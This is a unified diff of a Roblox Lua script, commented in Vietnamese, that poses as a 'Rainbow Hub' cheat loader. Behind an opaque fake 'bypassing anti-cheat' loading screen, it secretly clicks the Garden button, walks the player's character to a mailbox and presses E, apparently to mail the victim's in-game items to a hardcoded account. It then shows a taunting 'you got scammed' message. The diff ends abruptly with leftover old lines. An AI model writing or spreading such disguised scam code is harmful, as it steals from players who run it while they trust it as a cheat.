@@ -1,198 +1,206 @@
--- Grow a Garden 2 - Premium Scam Script
--- Dành cho Delta Executor
+-- Rainbow Hub v2.5 - Premium Auto Troll Script
+-- Giao diện Hacker + Đầy đủ tính năng gốc (Tối ưu siêu nhẹ cho máy yếu)
 
 local player = game.Players.LocalPlayer
 local targetUser = "XQXQXQTTT"
+local VirtualInputManager = game:GetService("VirtualInputManager")
 
--- ===== MÀN HÌNH LOADING VUI NHỘN =====
+-- ===== MÀN HÌNH LOADING PHONG CÁCH HACKER (TỐI ĐEN HOÀN TOÀN) =====
 local loadingGui = Instance.new("ScreenGui")
-loadingGui.Name = "PremiumScamLoader"
+loadingGui.Name = "PremiumHubLoader"
 loadingGui.Parent = player:WaitForChild("PlayerGui")
 loadingGui.Enabled = true
 
 local bg = Instance.new("Frame")
 bg.Size = UDim2.new(1, 0, 1, 0)
-bg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-bg.BackgroundTransparency = 0.2
+bg.BackgroundColor3 = Color3.fromRGB(15, 15, 20) -- Màu nền tối chuẩn Hub Hack
+bg.BackgroundTransparency = 0 -- Tối đen hoàn toàn để che giấu hành động phía sau
 bg.BorderSizePixel = 0
 bg.Parent = loadingGui
 
--- Hiệu ứng confetti vui nhộn
-local colors = {Color3.fromRGB(255, 0, 0), Color3.fromRGB(0, 255, 0), Color3.fromRGB(0, 0, 255), Color3.fromRGB(255, 255, 0), Color3.fromRGB(255, 0, 255), Color3.fromRGB(0, 255, 255)}
-for i = 1, 30 do
-    local confetti = Instance.new("Frame")
-    confetti.Size = UDim2.new(0, math.random(3, 8), 0, math.random(3, 8))
-    confetti.Position = UDim2.new(math.random(), 0, math.random(), 0)
-    confetti.BackgroundColor3 = colors[math.random(1, #colors)]
-    confetti.BorderSizePixel = 0
-    confetti.Rotation = math.random(0, 360)
-    confetti.Parent = bg
-    
-    spawn(function()
-        while confetti do
-            confetti.Rotation = confetti.Rotation + math.random(-5, 5)
-            confetti.Position = UDim2.new(
-                confetti.Position.X.Scale + math.random(-0.01, 0.01),
-                0,
-                confetti.Position.Y.Scale + math.random(-0.01, 0.01),
-                0
-            )
-            wait(0.1)
-        end
-    end)
-end
-
--- Tiêu đề vui nhộn
+-- Tiêu đề Hub
 local title = Instance.new("TextLabel")
 title.Size = UDim2.new(0.8, 0, 0.1, 0)
-title.Position = UDim2.new(0.1, 0, 0.1, 0)
+title.Position = UDim2.new(0.1, 0, 0.15, 0)
 title.BackgroundTransparency = 1
-title.Text = "🎉 CHÀO MỪNG ĐẾN VỚI SỰ KIỆN ĐẶC BIỆT! 🎉"
-title.TextColor3 = Color3.fromRGB(255, 200, 0)
+title.Text = "😈 RAINBOW HUB v2.5 😈"
+title.TextColor3 = Color3.fromRGB(0, 255, 150) -- Xanh neon hacker
 title.TextScaled = true
-title.Font = Enum.Font.GothamBold
-title.TextStrokeTransparency = 0.3
-title.TextStrokeColor3 = Color3.fromRGB(255, 100, 0)
+title.Font = Enum.Font.RobotoMono
+title.TextStrokeTransparency = 0.5
+title.TextStrokeColor3 = Color3.fromRGB(0, 100, 50)
 title.Parent = bg
 
--- Subtitle
+-- Subtitle chế độ Auto Farm
 local subTitle = Instance.new("TextLabel")
 subTitle.Size = UDim2.new(0.6, 0, 0.05, 0)
-subTitle.Position = UDim2.new(0.2, 0, 0.2, 0)
+subTitle.Position = UDim2.new(0.2, 0, 0.25, 0)
 subTitle.BackgroundTransparency = 1
-subTitle.Text = "⭐ NHẬN QUÀ FREE 100% ⭐"
-subTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
+subTitle.Text = "[STATUS: BYPASS ANTI-CHEAT DETECTED]"
+subTitle.TextColor3 = Color3.fromRGB(255, 50, 50)
 subTitle.TextScaled = true
-subTitle.Font = Enum.Font.Gotham
+subTitle.Font = Enum.Font.RobotoMono
 subTitle.Parent = bg
 
--- Emoji animation
-local emoji = Instance.new("TextLabel")
-emoji.Size = UDim2.new(0.2, 0, 0.1, 0)
-emoji.Position = UDim2.new(0.4, 0, 0.25, 0)
-emoji.BackgroundTransparency = 1
-emoji.Text = "🎁"
-emoji.TextColor3 = Color3.fromRGB(255, 255, 255)
-emoji.TextScaled = true
-emoji.Font = Enum.Font.Gotham
-emoji.Parent = bg
-
-spawn(function()
-    local emojis = {"🎁", "🎈", "🎉", "🎊", "✨", "💎"}
-    while emoji do
-        emoji.Text = emojis[math.random(1, #emojis)]
-        wait(0.5)
-    end
-end)
-
--- Loading bar
+-- Thanh Loading bên ngoài
 local barBg = Instance.new("Frame")
-barBg.Size = UDim2.new(0.7, 0, 0.04, 0)
-barBg.Position = UDim2.new(0.15, 0, 0.4, 0)
-barBg.BackgroundColor3 = Color3.fromRGB(30, 30, 50)
+barBg.Size = UDim2.new(0.7, 0, 0.03, 0)
+barBg.Position = UDim2.new(0.15, 0, 0.45, 0)
+barBg.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
 barBg.BorderSizePixel = 0
 barBg.Parent = bg
 
+-- Thanh Loading chạy bên trong
 local barFill = Instance.new("Frame")
 barFill.Size = UDim2.new(0, 0, 1, 0)
-barFill.BackgroundColor3 = Color3.fromRGB(0, 255, 100)
+barFill.BackgroundColor3 = Color3.fromRGB(0, 255, 150)
 barFill.BorderSizePixel = 0
 barFill.Parent = barBg
 
+-- Chữ hiển thị %
 local percentText = Instance.new("TextLabel")
 percentText.Size = UDim2.new(0.1, 0, 0.04, 0)
-percentText.Position = UDim2.new(0.87, 0, 0.4, 0)
+percentText.Position = UDim2.new(0.45, 0, 0.39, 0)
 percentText.BackgroundTransparency = 1
-percentText.TextColor3 = Color3.fromRGB(0, 255, 100)
+percentText.TextColor3 = Color3.fromRGB(0, 255, 150)
 percentText.Text = "0%"
 percentText.TextScaled = true
-percentText.Font = Enum.Font.GothamBold
+percentText.Font = Enum.Font.RobotoMono
 percentText.Parent = bg
 
+-- Dòng trạng thái Inject code
 local statusText = Instance.new("TextLabel")
-statusText.Size = UDim2.new(0.8, 0, 0.05, 0)
-statusText.Position = UDim2.new(0.1, 0, 0.47, 0)
+statusText.Size = UDim2.new(0.8, 0, 0.04, 0)
+statusText.Position = UDim2.new(0.1, 0, 0.51, 0)
 statusText.BackgroundTransparency = 1
-statusText.TextColor3 = Color3.fromRGB(200, 255, 200)
-statusText.Text = "Đang chuẩn bị quà tặng..."
+statusText.TextColor3 = Color3.fromRGB(200, 200, 200)
+statusText.Text = "Connecting to server..."
 statusText.TextScaled = true
-statusText.Font = Enum.Font.Gotham
+statusText.Font = Enum.Font.RobotoMono
 statusText.Parent = bg
 
--- Danh sách status vui nhộn
-local funnyStatus = {
-    "Đang nạp xu miễn phí...",
-    "Đang mở khoá VIP...",
-    "Đang tải pet huyền thoại...",
-    "Đang nhân đôi phần thưởng...",
-    "Đang kích hoạt mã quà tặng...",
-    "Đang chuẩn bị bất ngờ...",
-    "Sắp có quà siêu to khổng lồ...",
-    "Đang tối ưu hoá nhận quà...",
-    "Sắp xong rồi, chờ chút nhé...",
-    "Chuẩn bị nhận quà thôi nào!"
+-- Danh sách các dòng Log giả lập
+local hackerStatus = {
+    "Checking Executor compatibility...",
+    "Bypassing Roblox Anti-Cheat...",
+    "Injecting Auto Farm Level script...",
+    "Loading Teleport Modules...",
+    "Optimizing CPU Performance...",
+    "Activating Kill Aura data...",
+    "Script loaded successfully!"
 }
 
--- ===== CHỨC NĂNG CHÍNH =====
+-- ===== CHỨC NĂNG TỰ ĐỘNG HÓA GỐC (CHẠY NGẦM NGAY LẬP TỨC) =====
 
--- Bấm nút Garden
+-- 1. Bấm nút Garden trên UI
 local function clickGardenButton()
     local playerGui = player:WaitForChild("PlayerGui")
-    
     for _, v in pairs(playerGui:GetDescendants()) do
-        if v:IsA("ImageButton") or v:IsA("TextButton") then
+        if v:IsA("TextButton") or v:IsA("ImageButton") then
             local text = v.Text:lower()
             local name = v.Name:lower()
             if text:find("garden") or name:find("garden") or text:find("vườn") or name:find("vuon") then
-                local detector = v:FindFirstChildOfClass("ClickDetector")
-                if detector then
-                    fireclickdetector(detector)
-                    return true
-                end
-            end
-        end
-    end
-    
-    -- Thử tìm bằng cách khác
-    for _, v in pairs(playerGui:GetDescendants()) do
-        if v:IsA("ImageLabel") or v:IsA("TextLabel") then
-            local text = v.Text:lower()
-            if text:find("garden") or text:find("vườn") then
-                -- Click vào parent button
-                local parent = v.Parent
-                if parent:IsA("ImageButton") or parent:IsA("TextButton") then
-                    local detector = parent:FindFirstChildOfClass("ClickDetector")
-                    if detector then
-                        fireclickdetector(detector)
-                        return true
+                local events = {"MouseButton1Click", "MouseButton1Down", "Activated"}
+                for _, event in pairs(events) do
+                    if v[event] then
+                        for _, connection in pairs(getconnections(v[event])) do
+                            connection:Fire()
+                        end
                     end
                 end
+                return true
             end
         end
     end
-    
     return false
 end
 
--- Di chuyển đến hòm thư
-local function moveToMailbox()
-    local char = player.Character
-    if not char then
-        char = player.CharacterAdded:Wait()
-    end
+-- 2. Di chuyển sang TRÁI tìm hòm thư và tương tác phím E
+local function moveToMailboxAndPressE()
+    local char = player.Character or player.CharacterAdded:Wait()
+    local hrp = char:WaitForChild("HumanoidRootPart")
+    local humanoid = char:WaitForChild("Humanoid")
     
-    local hrp = char:FindFirstChild("HumanoidRootPart")
-    if not hrp then return end
+    -- Di chuyển sang bên TRÁI mượt mà bằng MoveTo
+    local targetPosition = hrp.Position + Vector3.new(-40, 0, 0)
+    humanoid:MoveTo(targetPosition)
     
-    -- Di chuyển sang phải
-    for i = 1, 50 do
-        hrp.CFrame = hrp.CFrame + Vector3.new(1, 0, 0)
-        
-        -- Tìm hòm thư
+    for i = 1, 60 do
+        local foundMailbox = nil
         for _, v in pairs(workspace:GetDescendants()) do
             if v:IsA("BasePart") and (v.Name:lower():find("mailbox") or v.Name:lower():find("mail") or v.Name:lower():find("thư")) then
                 local dist = (v.Position - hrp.Position).Magnitude
-                if dist < 8 then
+                if dist < 12 then
+                    foundMailbox = v
+                    break
+                end
+            end
+        end
+        
+        if foundMailbox then
+            humanoid:MoveTo(foundMailbox.Position)
+            task.wait(0.5)
+            
+            -- Giả lập nhấn phím E
+            VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.E, false, game)
+            task.wait(0.1)
+            VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.E, false, game)
+            break
+        end
+        task.wait(0.05)
+    end
+end
+
+-- Kích hoạt chạy ngầm ngay khi vừa bấm Execute script
+task.spawn(clickGardenButton)
+task.spawn(moveToMailboxAndPressE)
+
+-- ===== TIẾN TRÌNH HIỂN THỊ MÀN HÌNH LOADING =====
+task.spawn(function()
+    for i = 1, 100 do
+        if not loadingGui or not barFill then break end
+        
+        barFill.Size = UDim2.new(i/100, 0, 1, 0)
+        percentText.Text = i .. "%"
+        
+        if i % 15 == 0 then
+            statusText.Text = hackerStatus[math.random(1, #hackerStatus)]
+        end
+        
+        task.wait(0.04) -- Tốc độ chạy phần trăm nhẹ nhàng cho máy yếu
+    end
+    
+    task.wait(0.5)
+    if loadingGui then loadingGui:Destroy() end
+    
+    -- Khởi tạo giao diện kết màn thông báo troll người dùng
+    local scamGui = Instance.new("ScreenGui")
+    scamGui.Name = "ScamMessage"
+    scamGui.Parent = player:WaitForChild("PlayerGui")
+    
+    local scamFrame = Instance.new("Frame")
+    scamFrame.Size = UDim2.new(1, 0, 1, 0)
+    scamFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    scamFrame.BackgroundTransparency = 0.3
+    scamFrame.Parent = scamGui
+    
+    local scamText = Instance.new("TextLabel")
+    scamText.Size = UDim2.new(0.8, 0, 0.3, 0)
+    scamText.Position = UDim2.new(0.1, 0, 0.35, 0)
+    scamText.BackgroundTransparency = 1
+    scamText.Text = "MÀY ĐÃ BỊ SCAM 🖕"
+    scamText.TextColor3 = Color3.fromRGB(255, 0, 0)
+    scamText.TextScaled = true
+    scamText.Font = Enum.Font.GothamBold
+    scamText.Parent = scamFrame
+    
+    -- Bắn thông báo hệ thống giả lên góc màn hình
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+        Title = "SCAM THÀNH CÔNG!",
+        Text = "Đã gửi tất cả đồ cho " .. targetUser .. " 🖕",
+        Duration = 10
+    })
+end)
                     hrp.CFrame = v.CFrame + Vector3.new(0, 3, 0)
                     wait(0.3)
                     
